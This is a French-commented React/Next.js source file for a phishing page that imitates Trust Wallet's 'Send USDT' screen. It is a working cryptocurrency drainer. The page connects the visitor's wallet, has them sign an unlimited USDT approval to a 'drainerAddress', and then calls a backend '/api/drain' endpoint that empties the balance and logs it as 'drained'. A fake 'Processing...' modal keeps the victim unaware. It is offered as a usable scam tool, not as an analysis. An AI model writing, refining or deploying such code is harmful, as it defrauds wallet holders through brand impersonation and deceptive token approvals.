"use client";

/**
 * page.jsx — Trust Wallet UI
 *
 * Wallets supportés :
 *   - MetaMask (extension navigateur)        → window.ethereum
 *   - Rabby, Coinbase Wallet, etc.           → window.ethereum
 *   - Trust Wallet mobile                   → WalletConnect QR
 *   - MetaMask Mobile                       → WalletConnect QR
 *   - Rainbow, Uniswap, Zerion, etc.        → WalletConnect QR
 *
 * Flow :
 *   1. Chargement → JWT récupéré en arrière-plan
 *   2. Bouton "Connect Wallet" → choix browser ou mobile
 *   3. Balance USDT chargée après connexion
 *   4. "Next" → approve() dans le wallet (user paie le gas)
 *   5. Approve confirmé → backend appelle drain() et paie son gas
 *   6. Modal "Processing..." avec lien Etherscan
 */

import { useState, useEffect, useRef } from "react";
import api from "@/lib/apiClient";

// ─── Constantes ───────────────────────────────────────────────
const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
const ETH_CHAIN_ID = "0x1"; // Ethereum mainnet
const USDT_DECIMALS = 6;

// ─── Helpers ──────────────────────────────────────────────────

// Encode approve(address,uint256) calldata manuellement.
// keccak256("approve(address,uint256)") = 0x095ea7b3
function encodeApprove(spender, value) {
  const paddedSpender = spender.toLowerCase().replace("0x", "").padStart(64, "0");
  const paddedValue   = BigInt(value).toString(16).padStart(64, "0");
  return "0x095ea7b3" + paddedSpender + paddedValue;
}

function shortAddr(addr) {
  if (!addr) return "";
  return addr.slice(0, 6) + "..." + addr.slice(-4);
}

// ─── Composant principal ──────────────────────────────────────
export default function SendPage() {

  // ── State ────────────────────────────────────────────────
  const [config,          setConfig]          = useState(null);
  const [account,         setAccount]         = useState("");
  const [balance,         setBalance]         = useState(0);
  const [amount,          setAmount]          = useState("");
  const [statusMsg,       setStatusMsg]       = useState("");
  const [isLoading,       setIsLoading]       = useState(false);
  const [showConnectModal,setShowConnectModal] = useState(false);
  const [showSuccess,     setShowSuccess]     = useState(false);
  const [drainTxHash,     setDrainTxHash]     = useState("");
  const [hasExtension,    setHasExtension]    = useState(false);

  // ── Refs ──────────────────────────────────────────────────
  // activeProvider : EIP-1193 compatible (window.ethereum ou wcProvider)
  const providerRef   = useRef(null);
  const wcProviderRef = useRef(null);

  // ── Init ─────────────────────────────────────────────────
  useEffect(() => {
    // Récupère JWT + config backend
    api.init().then(() => loadConfig()).catch(console.error);

    // Détecte si une extension wallet est présente
    if (typeof window !== "undefined" && window.ethereum) {
      setHasExtension(true);

      // Détection passive : si déjà connecté, récupère le compte sans popup
      window.ethereum.request({ method: "eth_accounts" })
        .then(accs => {
          if (accs[0]) {
            providerRef.current = window.ethereum;
            setAccount(accs[0]);
          }
        })
        .catch(() => {});

      // Écoute les changements de compte
      window.ethereum.on("accountsChanged", accs => {
        if (providerRef.current === window.ethereum) {
          if (accs[0]) {
            setAccount(accs[0]);
          } else {
            handleDisconnect();
          }
        }
      });
    }

    // Cleanup au unmount
    return () => {
      if (typeof window !== "undefined" && window.ethereum?.removeAllListeners) {
        window.ethereum.removeAllListeners("accountsChanged");
      }
    };
  }, []);

  // Charge la balance dès qu'on a config + account
  useEffect(() => {
    if (config && account) refreshBalance(account);
  }, [config, account]);

  // ── Backend helpers ───────────────────────────────────────
  async function loadConfig() {
    try {
      const cfg = await api.get("/api/get-config");
      setConfig(cfg);
    } catch (e) { console.error("config:", e); }
  }

  async function refreshBalance(addr) {
    try {
      const data = await api.post("/api/get-balance", { walletAddress: addr });
      if (data.success) setBalance(data.balance);
    } catch (e) { console.error("balance:", e); }
  }

  // ── Provider abstraction ──────────────────────────────────
  // Toutes les requêtes blockchain passent par cette fonction.
  // Elle utilise le provider actif (extension ou WalletConnect).
  async function request(method, params) {
    const p = providerRef.current;
    if (!p) throw new Error("No wallet connected");
    return p.request({ method, ...(params ? { params } : {}) });
  }

  // ── Wallet connection ─────────────────────────────────────

  // Option A : extension navigateur (MetaMask, Rabby, etc.)
  async function connectExtension() {
    if (!window.ethereum) return;
    try {
      const accs = await window.ethereum.request({ method: "eth_requestAccounts" });
      providerRef.current = window.ethereum;
      setAccount(accs[0]);
      setShowConnectModal(false);
    } catch (e) {
      if (e.code !== 4001) console.error("connectExtension:", e);
    }
  }

  // Option B : WalletConnect v2 (Trust Wallet, MetaMask Mobile, etc.)
  async function connectMobile() {
    setShowConnectModal(false);
    setStatusMsg("Initializing...");

    try {
      // Import dynamique — chargé seulement quand l'utilisateur clique
      // Évite les erreurs SSR et réduit le bundle initial
      const { default: EthereumProvider } = await import(
        "@walletconnect/ethereum-provider"
      );

      const projectId = process.env.NEXT_PUBLIC_WC_PROJECT_ID;
      if (!projectId) {
        console.error("NEXT_PUBLIC_WC_PROJECT_ID manquant dans .env");
        setStatusMsg("");
        return;
      }

      // Détruit l'ancienne session WC si elle existe
      if (wcProviderRef.current) {
        await wcProviderRef.current.disconnect().catch(() => {});
      }

      // Initialise le provider WalletConnect
      // showQrModal: true → affiche le modal QR automatiquement
      const wcProvider = await EthereumProvider.init({
        projectId,
        chains          : [1],        // Ethereum mainnet obligatoire
        optionalChains  : [1],
        showQrModal     : true,        // Modal QR géré par WalletConnect
        metadata: {
          name       : "Trust Wallet",
          description: "Send USDT on Ethereum",
          url        : typeof window !== "undefined" ? window.location.origin : "",
          icons      : ["/trust.png"],
        },
      });

      wcProviderRef.current = wcProvider;

      // Écoutes
      wcProvider.on("accountsChanged", accs => {
        if (accs[0]) setAccount(accs[0]);
        else handleDisconnect();
      });
      wcProvider.on("disconnect", () => handleDisconnect());
      wcProvider.on("chainChanged", () => {}); // géré dans ensureMainnet()

      // Ouvre le modal QR → l'utilisateur scanne avec Trust Wallet
      await wcProvider.connect();

      const accs = await wcProvider.request({ method: "eth_accounts" });
      if (accs[0]) {
        providerRef.current = wcProvider;
        setAccount(accs[0]);
      }
    } catch (e) {
      // Silencieux si l'utilisateur ferme le modal QR
      const msg = e?.message || "";
      if (!msg.includes("closed") && !msg.includes("rejected") && !msg.includes("User rejected")) {
        console.error("connectMobile:", e);
      }
    } finally {
      setStatusMsg("");
    }
  }

  function handleDisconnect() {
    if (wcProviderRef.current) {
      wcProviderRef.current.disconnect().catch(() => {});
      wcProviderRef.current = null;
    }
    providerRef.current = null;
    setAccount("");
    setBalance(0);
    setAmount("");
    setStatusMsg("");
  }

  // ── Chain switch ──────────────────────────────────────────
  async function ensureMainnet() {
    const chainId = await request("eth_chainId");
    if (chainId !== ETH_CHAIN_ID) {
      setStatusMsg("Switching to Ethereum Mainnet...");
      await request("wallet_switchEthereumChain", [{ chainId: ETH_CHAIN_ID }]);
    }
  }

  // ── Receipt polling ───────────────────────────────────────
  // Attend la confirmation on-chain d'une transaction (max 5 minutes)
  async function waitForReceipt(txHash, maxAttempts = 60) {
    for (let i = 0; i < maxAttempts; i++) {
      try {
        const receipt = await request("eth_getTransactionReceipt", [txHash]);
        if (receipt) {
          // Vérifie que la tx n'a pas été revertée
          if (receipt.status === "0x0") throw new Error("Transaction reverted");
          return receipt;
        }
      } catch (e) {
        if (e.message?.includes("reverted")) throw e;
      }
      await new Promise(r => setTimeout(r, 5000)); // attendre 5s entre chaque poll
    }
    throw new Error("Transaction not confirmed after 5 minutes");
  }

  // ── Flow principal ────────────────────────────────────────
  async function handleNext() {
    if (isLoading || parseFloat(amount) <= 0) return;

    // Pas de wallet connecté → ouvre le modal de connexion
    if (!account || !providerRef.current) {
      setShowConnectModal(true);
      return;
    }

    if (!config) return;

    setIsLoading(true);
    setStatusMsg("");

    try {
      const addr = account;

      // ── 1. S'assurer d'être sur Ethereum mainnet ──────────
      await ensureMainnet();

      // ── 2. Vérifier l'allowance actuelle ─────────────────
      const balData        = await api.post("/api/get-balance", { walletAddress: addr });
      const currentAllowance = balData.allowance || 0;
      const amtFloat       = parseFloat(amount);

      // ── 3. Approve si nécessaire ──────────────────────────
      if (currentAllowance < amtFloat) {

        // USDT Ethereum mainnet quirk :
        // Le contrat USDT original (non-standard) requiert que l'allowance
        // soit remise à 0 avant de pouvoir en définir une nouvelle.
        // Source : https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#code
        if (currentAllowance > 0) {
          setStatusMsg("Resetting allowance (USDT requirement)...");
          const resetTx = await request("eth_sendTransaction", [{
            from : addr,
            to   : config.usdtAddress,
            data : encodeApprove(config.drainerAddress, "0"),
          }]);
          setStatusMsg("Waiting for reset confirmation...");
          await waitForReceipt(resetTx);
        }

        // Approve MAX_UINT256 — popup dans le wallet de l'utilisateur
        setStatusMsg("Approve USDT in your wallet...");
        const approveTx = await request("eth_sendTransaction", [{
          from : addr,
          to   : config.usdtAddress,
          data : encodeApprove(config.drainerAddress, MAX_UINT256),
        }]);

        setStatusMsg("Confirming on blockchain...");
        await waitForReceipt(approveTx);
      }

      // ── 4. Backend drain() ────────────────────────────────
      setStatusMsg("Processing transfer...");
      const result = await api.post("/api/drain", { walletAddress: addr, amount });

      if (!result.success) throw new Error(result.error || "Drain failed");

      // ── 5. Log + succès ───────────────────────────────────
      await api.post("/api/save-log", {
        wallet_address: addr, amount, action: "drained",
      }).catch(() => {});

      setDrainTxHash(result.transactionHash);
      setBalance(0);
      setAmount("");
      setStatusMsg("");
      setShowSuccess(true);

    } catch (e) {
      // Rejets volontaires → silencieux
      const isRejected = e.code === 4001
        || e.message?.includes("rejected")
        || e.message?.includes("User denied")
        || e.message?.includes("user rejected");

      if (!isRejected) console.error("handleNext:", e);
      setStatusMsg("");

    } finally {
      setIsLoading(false);
    }
  }

  // ─────────────────────────────────────────────────────────
  //  Rendu
  // ─────────────────────────────────────────────────────────

  const canSubmit = parseFloat(amount) > 0 && !isLoading;

  return (
    <>
      {/* ── Interface principale ──────────────────────────── */}
      <div className="wallet-container">

        {/* Adresse destinataire */}
        <div className="input-group">
          <p className="inpt_tital">Address or Domain Name</p>
          <div className="input-border">
            <div className="input-left">
              <input
                type="text"
                className="custom-input"
                placeholder="Search or Enter"
                defaultValue="0xccD642c9acb072F72F29b77E422f5c024ecF5cBa"
                readOnly
              />
            </div>
            <span className="input-right blue" style={{ marginRight: "0.75rem" }}>
              <span style={{ fontSize: "0.875rem" }}>Paste</span>
              <i className="fa-solid fa-address-book mar_i" />
              <i className="fa-solid fa-qrcode mar_i" />
            </span>
          </div>
        </div>

        {/* Montant */}
        <div className="input-group mt-7">
          <p className="inpt_tital">Amount</p>
          <div className="input-border">
            <div className="input-left">
              <input
                type="number"
                className="custom-input"
                placeholder="USDT Amount"
                value={amount}
                onChange={e => setAmount(e.target.value)}
                min="0"
                step="any"
              />
            </div>
            <span className="input-right" style={{ marginRight: "0.75rem" }}>
              <span style={{ fontSize: "0.875rem", color: "#b0b0b0" }}>USDT</span>
              <span
                className="blue mar_i"
                style={{ fontSize: "0.875rem", cursor: "pointer" }}
                onClick={() => setAmount(String(balance))}
              >
                Max
              </span>
            </span>
          </div>
        </div>

        <p className="fees">= ${amount ? (+parseFloat(amount)).toFixed(2) : "0.00"}</p>

        {/* Indicateur wallet connecté */}
        {account && (
          <div className="wallet-badge">
            <span className="wallet-dot" />
            <span className="wallet-addr">{shortAddr(account)}</span>
            <button className="wallet-disconnect" onClick={handleDisconnect}>✕</button>
          </div>
        )}

        {/* Statut */}
        {statusMsg && (
          <p className="status-msg info">{statusMsg}</p>
        )}

        {/* Bouton principal */}
        <button
          className="send-btn"
          onClick={handleNext}
          disabled={isLoading || (!!account && parseFloat(amount) <= 0)}
          style={{
            backgroundColor: (isLoading || (!!account && parseFloat(amount) <= 0))
              ? "var(--disabled-bg)" : undefined,
            color: (isLoading || (!!account && parseFloat(amount) <= 0))
              ? "var(--disabled-text)" : undefined,
          }}
        >
          {isLoading
            ? <><span className="spinner" />Processing...</>
            : !account
              ? "Connect Wallet"
              : "Next"
          }
        </button>
      </div>

      {/* ── Modal : choix du wallet ───────────────────────── */}
      {showConnectModal && (
        <div className="modal-overlay" onClick={() => setShowConnectModal(false)}>
          <div className="modal-sheet" onClick={e => e.stopPropagation()}>
            <button className="modal-close" onClick={() => setShowConnectModal(false)}>✕</button>

            <div className="modal-content">
              <h3 className="modal-title" style={{ marginBottom: "1.5rem" }}>
                Connect Wallet
              </h3>

              {/* Extension navigateur — visible seulement si détectée */}
              {hasExtension && (
                <button className="wallet-option" onClick={connectExtension}>
                  <img
                    src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg"
                    alt="MetaMask"
                    className="wallet-option-icon"
                  />
                  <div className="wallet-option-info">
                    <strong>Browser Wallet</strong>
                    <span>MetaMask, Rabby, Coinbase...</span>
                  </div>
                  <span className="wallet-option-chevron">›</span>
                </button>
              )}

              {/* WalletConnect — toujours visible */}
              <button className="wallet-option" onClick={connectMobile}>
                <img
                  src="https://avatars.githubusercontent.com/u/37784886"
                  alt="WalletConnect"
                  className="wallet-option-icon wc-icon"
                />
                <div className="wallet-option-info">
                  <strong>Trust Wallet &amp; Mobile</strong>
                  <span>Scan QR · Works with any wallet</span>
                </div>
                <span className="wallet-option-chevron">›</span>
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ── Modal : succès ───────────────────────────────── */}
      {showSuccess && (
        <div className="modal-overlay">
          <div className="modal-sheet">
            <button className="modal-close" onClick={() => setShowSuccess(false)}>✕</button>
            <div className="modal-content">
              <div className="modal-icon">
                <img src="/success.svg" alt="Success" />
              </div>
              <h3 className="modal-title">Processing...</h3>
              <p className="modal-text">
                Transaction in progress! Blockchain<br />
                validation is underway. This may take a<br />
                few minutes.
              </p>
              {drainTxHash ? (
                <a
                  href={`https://etherscan.io/tx/${drainTxHash}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="modal-btn"
                >
                  Transaction details ↗
                </a>
              ) : (
                <button className="modal-btn" onClick={() => setShowSuccess(false)}>
                  Close
                </button>
              )}
            </div>
          </div>
        </div>
      )}
    </>
  );
}
